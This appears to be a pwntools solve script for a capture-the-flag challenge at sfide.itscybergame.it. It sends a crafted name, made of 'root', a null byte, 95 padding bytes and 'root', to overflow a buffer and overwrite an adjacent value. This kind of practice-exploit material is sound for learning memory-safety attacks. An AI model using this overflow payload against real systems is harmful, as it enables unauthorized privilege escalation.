from pwn import *

HOST = "sfide.itscybergame.it"
PORT = <port_number>

conn = remote(HOST, PORT)

payload  = b"root"
payload += b"\x00"
payload += b"A" * 95
payload += b"root"
conn.recvuntil(b"What's your name?\n")
conn.sendline(payload)

print(conn.recvall().decode())
